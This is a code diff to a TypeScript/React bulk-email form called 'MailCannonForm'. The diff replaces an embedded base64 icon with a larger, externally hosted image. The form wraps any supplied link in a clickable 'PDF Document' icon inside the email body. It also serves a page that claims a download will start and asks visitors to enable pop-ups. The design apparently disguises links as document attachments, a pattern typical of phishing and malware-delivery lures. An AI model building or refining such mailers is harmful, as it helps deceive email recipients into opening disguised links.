@@ -38,7 +38,7 @@ type MailCannonFormValues = z.infer<typeof formSchema>;
 const API_ROUTE = "/api/send-email";
 
 // Base64 encoded PDF icon (small and generic)
-const PDF_ICON_BASE64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAABqElEQVRoQ+2Y0Q3CMAxG3xBDJBJAEMZfwCYpIhnACYAJwC5gEnACmAC6AWzJkWTgFzWdXb9kS/zJ3/s1O9PTMAzDMP4fUqnJdJtM5jSaTqfrTfB3T6bT6T+dZtPZ6Wzax2Gf5/v5/gGvj0P8BngpX/N/jAALgAALgAALgAALgAALgAALgAALgAALgAALgAALgAD+LwB8A5yzgHHhD3ADfAf+A76BV/gDbD6B95V5b51a5tY5d+3Q2gT8BVz4E/hR+I/wE/gX+Bv4T/A/8B/wJ/CjcC7bY+UE+AecK3hH+K/wG/gL+BX4S/hZcH76A3wC5x3hI/A/8I/wh/A/8J/whfB/gV8VzBvAV+Bv4UnhaIEfge+EvwV/Bf4S/hY+Fv4fMFcwgM/AX8KfwtECP4I/Ap8LfxN+Fv4M/g3+DP4S/hb+Fv4N/A38LegfIEZwL9hY8F/wL/A/8B/wL/A/8B/wL/A34G/hb/l3we/AXcBDwCLMORf//8BePhP8PfhP4N/wz8Mwwgs+AM63cILSt2upwAAAABJRU5ErkJggg==";
+const PDF_ICON_URL = "https://i.pinimg.com/1200x/37/a1/4e/37a14ee968a6a729725ba69e5c15de22.jpg";
 
 export default function MailCannonForm() {
   const { toast } = useToast();
@@ -81,7 +81,7 @@ export default function MailCannonForm() {
     // Prepare email body as HTML
     let emailBody = values.body.replace(/\n/g, '<br>');
     if (values.linkUrl) {
-      emailBody += `<br><br><a href="${values.linkUrl}" target="_blank" rel="noopener noreferrer"><img src="${PDF_ICON_BASE64}" alt="PDF Document" width="48" height="48" style="vertical-align: middle;"></a>`;
+      emailBody += `<br><br><a href="${values.linkUrl}" target="_blank" rel="noopener noreferrer"><img src="${PDF_ICON_URL}" alt="PDF Document" width="128" height="128" style="vertical-align: middle;"></a>`;
     }
 
     const formData = new FormData();
@@ -125,7 +125,7 @@ export default function MailCannonForm() {
 </script>
 </head>
 <body>
-  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAABqElEQVRoQ+2Y0Q3CMAxG3xBDJBJAEMZfwCYpIhnACYAJwC5gEnACmAC6AWzJkWTgFzWdXb9kS/zJ3/s1O9PTMAzDMP4fUqnJdJtM5jSaTqfrTfB3T6bT6T+dZtPZ6Wzax2Gf5/v5/gGvj0P8BngpX/N/jAALgAALgAALgAALgAALgAALgAALgAALgAALgAALgAD+LwB8A5yzgHHhD3ADfAf+A76BV/gDbD6B95V5b51a5tY5d+3Q2gT8BVz4E/hR+I/wE/gX+Bv4T/A/8B/wJ/CjcC7bY+UE+AecK3hH+K/wG/gL+BX4S/hZcH76A3wC5x3hI/A/8I/wh/A/8J/whfB/gV8VzBvAV+Bv4UnhaIEfge+EvwV/Bf4S/hY+Fv4fMFcwgM/AX8KfwtECP4I/Ap8LfxN+Fv4M/g3+DP4S/hb+Fv4N/A38LegfIEZwL9hY8F/wL/A/8B/wL/A/8B/wL/A34G/hb/l3we/AXcBDwCLMORf//8BePhP8PfhP4N/wz8Mwwgs+AM63cILSt2upwAAAABJRU5ErkJggg==" alt="PDF Icon" width="32" height="32">
+  <img src="https://i.pinimg.com/1200x/37/a1/4e/37a14ee968a6a729725ba69e5c15de22.jpg" alt="PDF Icon" width="32" height="32">
   <h1>Your download should start automatically. If not, please enable pop-ups for this site.</h1>
 </body>
 </html>`;
